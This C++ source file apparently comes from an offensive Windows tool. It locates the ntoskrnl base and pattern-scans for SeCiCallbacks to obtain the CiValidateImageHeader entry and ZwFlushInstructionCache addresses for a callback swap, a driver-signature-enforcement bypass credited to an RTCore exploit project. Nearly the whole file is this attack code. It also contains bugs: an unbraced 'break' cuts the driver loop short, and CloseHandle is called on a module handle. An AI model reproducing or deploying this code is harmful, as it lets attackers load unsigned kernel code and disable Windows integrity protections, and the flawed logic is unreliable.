#include "includes.h"
#include <DbgHelp.h>
#include "ntdll.h"

/*
* EnumerateKernelModules
*
* Purpose:
*
* Retrieve ntoskrnl.exe base image addr from kernel space.
*
* Params:
*
* Creds:
* https://github.com/Offensive-Panda/NT-AUTHORITY-SYSTEM-CONTEXT-RTCORE
*/

void* modules::retr_ntos_base() {
    DWORD out{ 0 };
    DWORD nb{ 0 };
    PVOID* base{ NULL };
    std::printf( "[*] Enumerating Loaded Drivers...\n" );
    if ( EnumDeviceDrivers( NULL, 0, &nb ) ) {
        base = ( PVOID* )malloc( nb );
        if ( EnumDeviceDrivers( base, nb, &out ) ) 
            return ( void* )base[0];
    } 
    return { NULL };
}

PVOID modules::find_kernel_device( const std::wstring& targetModuleName ){
    constexpr DWORD maxDrivers = { 1024 };
    LPVOID drivers[maxDrivers];
    DWORD cbNeeded = { 0 };

    // Query loaded kernel drivers
    std::printf( "[*] Enumerating Loaded Drivers...\n" );

    if ( !EnumDeviceDrivers( drivers, sizeof( drivers ), &cbNeeded ) || cbNeeded > sizeof( drivers ) ) return 0;

    std::this_thread::sleep_for( std::chrono::milliseconds( 300 ) );

    int cDrivers = cbNeeded / sizeof( LPVOID );

    for ( int i = 0; i < cDrivers; ++i ) {
        TCHAR szDriverName[MAX_PATH] = { 0 };

        if ( GetDeviceDriverBaseNameW( drivers[i], szDriverName, MAX_PATH ) ) {

            if ( helpers::match_ascii_icase( szDriverName, targetModuleName.c_str() ) ) {
                return drivers[i];
            }
        }
        else
            std::wcerr << L"[!] Failed to get driver base name for driver at: " << drivers[i] << std::endl; break;
    }
    // Failed, just return false
    return 0;
}

/*
* get_CIValidate_ImageHeaderEntry
*
* Purpose:
*   
* patch SeValidateImageHeader
*/

seCiCallbacks_swap modules::get_CIValidate_ImageHeaderEntry() {
    auto kModuleBase = modules::retr_ntos_base();
    std::printf( "[*] Kernel base addr: 0x%p\n", kModuleBase );

    HMODULE uNt = LoadLibraryEx( L"ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES );

    MODULEINFO modInfo{};
    if ( !GetModuleInformation( GetCurrentProcess(), uNt, &modInfo, sizeof( modInfo ) ) ) return {};

    const uint8_t* uNtAddr = reinterpret_cast< const uint8_t* >( uNt );
    size_t scanSize{ modInfo.SizeOfImage };

    const uint8_t pattern[] = {
        0x41, 0xB8, 0x05, 0x00, 0x00, 0x00,       // mov r8d, 5               (opcode + immediate dword 5)
        0x4C, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, // lea r9, [rip + offset]  (RIP-relative addressing with 4-byte offset placeholder)
        0x48, 0x89, 0x44, 0x24, 0x20              // mov [rsp+0x20], rax     (store rax at rsp+0x20)
    };

    uint64_t seCiCallbacksInstr{ 0 };
    if ( !helpers::find_pattern( uNtAddr, scanSize, pattern, sizeof( pattern ), seCiCallbacksInstr ) ) return {};

    uint64_t ripTargetAddr = seCiCallbacksInstr + 6;
    uint64_t seCiCallbacksAddr = helpers::ResolveRipRelative( ripTargetAddr, 3, 7 );

    uint64_t kernelOffset = seCiCallbacksAddr - reinterpret_cast< uint64_t >( uNtAddr );
    uint64_t kernelAddress = reinterpret_cast< uint64_t >( kModuleBase ) + kernelOffset;

    uint64_t zwFlushInstructionCache = static_cast< uint64_t >( reinterpret_cast< uintptr_t >( kModuleBase ) ) + ( static_cast< uintptr_t > 
        ( helpers::GetProcAddress( uNt, L"ZwFlushInstructionCache" ) ) - reinterpret_cast< uintptr_t >( uNtAddr ) );

    uint64_t ciValidateImageHeaderEntry = kernelAddress + 0x20;

    if ( uNt ) CloseHandle( uNt );

    return seCiCallbacks_swap{ ciValidateImageHeaderEntry, zwFlushInstructionCache };
}


